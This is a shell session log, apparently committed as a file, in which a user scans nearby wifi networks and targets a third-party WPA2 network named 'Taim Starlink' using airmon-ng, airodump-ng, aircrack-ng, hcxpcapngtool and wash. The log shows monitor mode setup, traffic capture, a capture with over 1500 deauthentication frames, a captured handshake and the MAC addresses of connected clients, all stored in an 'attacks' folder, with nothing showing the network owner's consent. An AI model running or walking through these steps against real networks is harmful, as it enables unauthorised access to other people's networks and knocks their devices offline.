@@ -1,0 +1,461 @@
+majd@Ubuntu-ThinkPad-P50:~$ nmcli -f ssid,bssid,chan,signal,security dev wifi list --rescan yes
+SSID            BSSID              CHAN  SIGNAL  SECURITY  
+Me              2A:AB:DD:35:50:5E  1     89      WPA2      
+Taim Starlink   80:AF:CA:CA:A3:D3  11    59      WPA1 WPA2 
+TP-LINK_79ADF6  34:E8:94:79:AD:F6  6     47      WPA2      
+W0053103838712  26:4C:AB:48:B9:A3  1     44      WPA1 WPA2 
+--              18:A6:F7:62:30:8E  5     29      WPA1 WPA2 
+majd@Ubuntu-ThinkPad-P50:~$ sudo iw dev wlp4s0 scan | grep -A80 -i "SSID: Taim Starlink"
+[sudo] password for majd: 
+	SSID: Taim Starlink\x20
+	Supported rates: 1.0* 2.0* 5.5* 11.0* 9.0 18.0 36.0 54.0 
+	DS Parameter set: channel 11
+	ERP: <no flags>
+	Extended supported rates: 6.0 12.0 24.0 48.0 
+	HT capabilities:
+		Capabilities: 0x11ee
+			HT20/HT40
+			SM Power Save disabled
+			RX HT20 SGI
+			RX HT40 SGI
+			TX STBC
+			RX STBC 1-stream
+			Max AMSDU length: 3839 bytes
+			DSSS/CCK HT40
+		Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
+		Minimum RX AMPDU time spacing: 4 usec (0x05)
+		HT RX MCS rate indexes supported: 0-15, 32
+		HT TX MCS rate indexes are undefined
+	HT operation:
+		 * primary channel: 11
+		 * secondary channel offset: below
+		 * STA channel width: any
+		 * RIFS: 0
+		 * HT protection: 20 MHz
+		 * non-GF present: 1
+		 * OBSS non-GF present: 0
+		 * dual beacon: 0
+		 * dual CTS protection: 0
+		 * STBC beacon: 0
+		 * L-SIG TXOP Prot: 0
+		 * PCO active: 0
+		 * PCO phase: 0
+	WPA:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+	RSN:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+	Extended capabilities:
+	BSS Load:
+		 * station count: 4
+		 * channel utilisation: 0/255
+		 * available admission capacity: 31250 [*32us]
+	WMM:	 * Parameter version 1
+		 * BE: CW 15-1023, AIFSN 3
+		 * BK: CW 15-1023, AIFSN 7
+		 * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
+		 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
+	TPC report: TX power: 19 dBm
+	RM enabled capabilities:
+		Capabilities: 0xf3 0xd0 0x01 0x00 0x0c
+			Link Measurement
+			Neighbor Report
+			Beacon Passive Measurement
+			Beacon Active Measurement
+			Beacon Table Measurement
+			Beacon Measurement Reporting Conditions
+			LCI Measurement
+			Transmit Stream/Category Measurement
+			Triggered Transmit Stream/Category
+			AP Channel Report
+			FTM Range Report
+			Civic Location Measurement
+		Nonoperating Channel Max Measurement Duration: 0
+		Measurement Pilot Capability: 4
+	Overlapping BSS scan params:
+		 * passive dwell: 20 TUs
+		 * active dwell: 10 TUs
+		 * channel width trigger scan interval: 300 s
+		 * scan passive total per channel: 200 TUs
+		 * scan active total per channel: 20 TUs
+		 * BSS width channel transition delay factor: 5
+		 * OBSS Scan Activity Threshold: 0.25 %
+	Country: DE	Environment: Indoor/Outdoor
+		Channels [1 - 13] @ 16 dBm
+BSS 18:a6:f7:62:30:8e(on wlp4s0)
+	last seen: 5598.217s [boottime]
+majd@Ubuntu-ThinkPad-P50:~$ sudo airmon-ng check
+sudo airmon-ng check kill
+sudo airmon-ng start wlp4s0 11
+Found 4 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+  38557 avahi-daemon
+  38559 avahi-daemon
+  41211 NetworkManager
+  41491 wpa_supplicant
+
+majd@Ubuntu-ThinkPad-P50:~$ sudo airmon-ng check
+
+Found 4 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+  38557 avahi-daemon
+  38559 avahi-daemon
+  41211 NetworkManager
+  41491 wpa_supplicant
+
+majd@Ubuntu-ThinkPad-P50:~$ sudo airmon-ng check kill
+
+Killing these processes:
+
+    PID Name
+  41491 wpa_supplicant
+  56494 avahi-daemon
+  56496 avahi-daemon
+
+majd@Ubuntu-ThinkPad-P50:~$ sudo airmon-ng start wlp4s0 11
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+  56509 avahi-daemon
+  56511 avahi-daemon
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp4s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
+		(mac80211 monitor mode vif enabled for [phy0]wlp4s0 on [phy0]wlp4s0mon)
+		(mac80211 station mode vif disabled for [phy0]wlp4s0)
+
+majd@Ubuntu-ThinkPad-P50:~$ iw dev
+phy#0
+	Interface wlp4s0mon
+		ifindex 20
+		wdev 0x9
+		addr 44:85:00:aa:f0:14
+		type monitor
+		channel 11 (2462 MHz), width: 20 MHz (no HT), center1: 2462 MHz
+majd@Ubuntu-ThinkPad-P50:~$ sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 wlp4s0mon
+
+
+ CH 11 ][ Elapsed: 42 s ][ 2026-05-09 01:41 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 80:AF:CA:CA:A3:D3  -60   0      451     5430  141  11  270   WPA2 CCMP   PSK  Taim Starlink                              
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 80:AF:CA:CA:A3:D3  04:10:6B:46:59:9E  -86    0 - 1e     0        2                                                        
+ 80:AF:CA:CA:A3:D3  D6:08:7D:3F:4B:85  -79    2e- 6e     0       51                                                        
+ 80:AF:CA:CA:A3:D3  3A:93:CD:6F:AB:34  -75    0 - 1      0        2                                                        
+ 80:AF:CA:CA:A3:D3  3E:4F:AE:61:46:3F  -79   24e-24e    63     5333                                                        
+Quitting...
+majd@Ubuntu-ThinkPad-P50:~$ cd /home/majd/Documents/attacks
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 -w taim_preauth wlp4s0mon
+01:44:42  Created capture file "taim_preauth-01.cap".
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ CH 11 ][ Elapsed: 15 mins ][ 2026-05-09 02:00 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 80:AF:CA:CA:A3:D3  -59  60     9225    57145    3  11  270   WPA2 CCMP   PSK  Taim Starlink                              
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 80:AF:CA:CA:A3:D3  04:10:6B:46:59:9E  -88    1e- 1      0    12856                                                        
+ 80:AF:CA:CA:A3:D3  D6:08:7D:3F:4B:85  -79    2e- 6e     0      522                                                        
+ 80:AF:CA:CA:A3:D3  3A:93:CD:6F:AB:34  -83    2e- 1e     0       88                                                        
+ 80:AF:CA:CA:A3:D3  3E:4F:AE:61:46:3F  -69    1e- 1      0    43869                                                        
+Quitting...
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ aircrack-ng taim_preauth-01.cap
+Reading packets, please wait...
+Opening taim_preauth-01.cap
+Read 91262 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  80:AF:CA:CA:A3:D3  Taim Starlink             WPA (0 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening taim_preauth-01.cap
+Read 91262 packets.
+
+1 potential targets
+
+Please specify a dictionary (option -w).
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ hcxpcapngtool taim_preauth-01.cap
+hcxpcapngtool 6.2.7 reading from taim_preauth-01.cap...
+
+summary capture file
+--------------------
+file name................................: taim_preauth-01.cap
+version (pcap/cap).......................: 2.4 (very basic format without any additional information)
+timestamp minimum (GMT)..................: 09.05.2026 01:44:42
+timestamp maximum (GMT)..................: 09.05.2026 02:00:26
+used capture interfaces..................: 1
+link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
+endianness (capture system)...............: little endian
+packets inside...........................: 91262
+ESSID (total unique).....................: 1
+BEACON (total)...........................: 1
+BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
+PROBERESPONSE (total)....................: 197
+WPA encrypted............................: 57145
+EAPOL ANONCE error corrections (NC)......: not detected
+
+frequency statistics from radiotap header (frequency: received packets)
+-----------------------------------------------------------------------
+not available due to missing radiotap header
+
+Information: no hashes written to hash files
+
+Information: limited dump file format detected!
+This file format is a very basic format to save captured network data.
+It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead.
+The PCAP Next Generation dump file format is an attempt to overcome the limitations
+of the currently widely used (but limited) libpcap (cap, pcap) format.
+https://www.wireshark.org/docs/wsug_html_chunked/AppFiles.html#ChAppFilesCaptureFilesSection
+https://github.com/pcapng/pcapng
+
+Information: radiotap header is missing!
+Radiotap is a de facto standard for 802.11 frame injection and reception.
+The radiotap header format is a mechanism to supply additional information about frames,
+from the driver to userspace applications.
+https://www.radiotap.org/
+
+Information: missing frames!
+This dump file does not contain undirected proberequest frames.
+An undirected proberequest may contain information about the PSK.
+It always happens if the capture file was cleaned or
+it could happen if filter options are used during capturing.
+That makes it hard to recover the PSK.
+
+Information: missing frames!
+This dump file does not contain important frames like
+authentication, association or reassociation.
+It always happens if the capture file was cleaned or
+it could happen if filter options are used during capturing.
+That makes it hard to recover the PSK.
+
+Information: missing frames!
+This dump file does not contain enough EAPOL M1 frames.
+It always happens if the capture file was cleaned or
+it could happen if filter options are used during capturing.
+That makes it impossible to calculate nonce-error-correction values.
+
+
+session summary
+---------------
+processed cap files...................: 1
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ command -v wash
+/usr/bin/wash
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo wash -i wlp4s0mon -C                                                    
+[sudo] password for majd: 
+wash: invalid option -- 'C'
+
+Wash v1.6.6 WiFi Protected Setup Scan Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner
+
+Required Arguments:
+	-i, --interface=<iface>              Interface to capture packets on
+	-f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files
+
+Optional Arguments:
+	-c, --channel=<num>                  Channel to listen on [auto]
+	-n, --probes=<num>                   Maximum number of probes to send to each AP in scan mode [15]
+	-O, --output-file=<filename>         Write packets of interest into pcap file
+	-F, --ignore-fcs                     Ignore frame checksum errors
+	-2, --2ghz                           Use 2.4GHz 802.11 channels
+	-5, --5ghz                           Use 5GHz 802.11 channels
+	-s, --scan                           Use scan mode
+	-u, --survey                         Use survey mode [default]
+	-a, --all                            Show all APs, even those without WPS
+	-j, --json                           print extended WPS info as json
+	-U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)
+	-p, --progress                       Show percentage of crack progress
+	-h, --help                           Show help
+
+Example:
+	wash -i wlan0mon
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo wash -i wlp4s0mon -c 11
+BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+--------------------------------------------------------------------------------
+[!] Found packet with bad FCS, skipping...
+^C
+
+
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 -w taim_deauth_test
+No interface specified.
+"airodump-ng --help" for help.
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 -w taim_deauth_test wlp4s0mon
+02:07:29  Created capture file "taim_deauth_test-01.cap".
+
+
+ CH 11 ][ Elapsed: 1 min ][ 2026-05-09 02:08 ][ WPA handshake: 80:AF:CA:CA:A3:D3 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 80:AF:CA:CA:A3:D3  -60 100      772     4746   25  11  270   WPA2 CCMP   PSK  Taim Starlink                              
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 80:AF:CA:CA:A3:D3  D6:08:7D:3F:4B:85  -79   12e- 6e     0      917                                                        
+ 80:AF:CA:CA:A3:D3  3A:93:CD:6F:AB:34  -80    1e- 1e   840      745  EAPOL                                                 
+ 80:AF:CA:CA:A3:D3  04:10:6B:46:59:9E  -87    1e- 1e    25     1852                                                        
+ 80:AF:CA:CA:A3:D3  3E:4F:AE:61:46:3F  -67   24e- 1   8408     2288  EAPOL                                                 
+Quitting...
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ aircrack-ng taim_deauth_test-01.cap
+Reading packets, please wait...
+Opening taim_deauth_test-01.cap
+Resetting EAPOL Handshake decoder state.
+Read 13054 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  80:AF:CA:CA:A3:D3  Taim Starlink             WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening taim_deauth_test-01.cap
+Resetting EAPOL Handshake decoder state.
+Read 13054 packets.
+
+1 potential targets
+
+Please specify a dictionary (option -w).
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ hcxpcapngtool taim_deauth_test-01.cap
+hcxpcapngtool 6.2.7 reading from taim_deauth_test-01.cap...
+
+summary capture file
+--------------------
+file name................................: taim_deauth_test-01.cap
+version (pcap/cap).......................: 2.4 (very basic format without any additional information)
+timestamp minimum (GMT)..................: 09.05.2026 02:07:29
+timestamp maximum (GMT)..................: 09.05.2026 02:08:48
+used capture interfaces..................: 1
+link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
+endianness (capture system)...............: little endian
+packets inside...........................: 13054
+ESSID (total unique).....................: 1
+BEACON (total)...........................: 1
+BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
+ACTION (total)...........................: 47
+PROBERESPONSE (total)....................: 84
+DEAUTHENTICATION (total).................: 1542
+AUTHENTICATION (total)...................: 6
+AUTHENTICATION (OPEN SYSTEM).............: 6
+ASSOCIATIONREQUEST (total)...............: 4
+ASSOCIATIONREQUEST (PSK).................: 4
+WPA encrypted............................: 4730
+EAPOL messages (total)...................: 16
+EAPOL RSN messages.......................: 16
+EAPOLTIME gap (measured maximum usec)....: 36998735
+EAPOL ANONCE error corrections (NC)......: not detected
+EAPOL M1 messages (total)................: 4
+EAPOL M2 messages (total)................: 5
+EAPOL M3 messages (total)................: 4
+EAPOL M4 messages (total)................: 3
+EAPOL pairs (total)......................: 10
+EAPOL pairs (best).......................: 3
+EAPOL M32E2 (authorized).................: 3
+
+frequency statistics from radiotap header (frequency: received packets)
+-----------------------------------------------------------------------
+not available due to missing radiotap header
+
+Information: no hashes written to hash files
+
+Warning: too many deauthentication/disassociation frames detected!
+That can cause that an ACCESS POINT change channel, reset EAPOL TIMER,
+renew ANONCE and set PMKID to zero.
+This could prevent to calculate a valid EAPOL MESSAGE PAIR
+or to get a valid PMKID.
+
+Information: limited dump file format detected!
+This file format is a very basic format to save captured network data.
+It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead.
+The PCAP Next Generation dump file format is an attempt to overcome the limitations
+of the currently widely used (but limited) libpcap (cap, pcap) format.
+https://www.wireshark.org/docs/wsug_html_chunked/AppFiles.html#ChAppFilesCaptureFilesSection
+https://github.com/pcapng/pcapng
+
+Information: radiotap header is missing!
+Radiotap is a de facto standard for 802.11 frame injection and reception.
+The radiotap header format is a mechanism to supply additional information about frames,
+from the driver to userspace applications.
+https://www.radiotap.org/
+
+Information: missing frames!
+This dump file does not contain undirected proberequest frames.
+An undirected proberequest may contain information about the PSK.
+It always happens if the capture file was cleaned or
+it could happen if filter options are used during capturing.
+That makes it hard to recover the PSK.
+
+
+session summary
+---------------
+processed cap files...................: 1
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ cat taim_preauth-01.csv
+
+BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
+80:AF:CA:CA:A3:D3, 2026-05-09 01:44:42, 2026-05-09 02:00:27, 11, 270, WPA2, CCMP, PSK, -59,     9225,    57145,   0.  0.  0.  0,  14, Taim Starlink , 
+
+Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
+3E:4F:AE:61:46:3F, 2026-05-09 01:44:42, 2026-05-09 02:00:25, -69,    43869, 80:AF:CA:CA:A3:D3,
+3A:93:CD:6F:AB:34, 2026-05-09 01:44:50, 2026-05-09 02:00:00, -83,       88, 80:AF:CA:CA:A3:D3,
+D6:08:7D:3F:4B:85, 2026-05-09 01:44:55, 2026-05-09 02:00:24, -79,      522, 80:AF:CA:CA:A3:D3,
+04:10:6B:46:59:9E, 2026-05-09 01:45:02, 2026-05-09 02:00:25, -88,    12856, 80:AF:CA:CA:A3:D3,
+
+majd@Ubuntu-ThinkPad-P50:~/Documents/attacks$ 
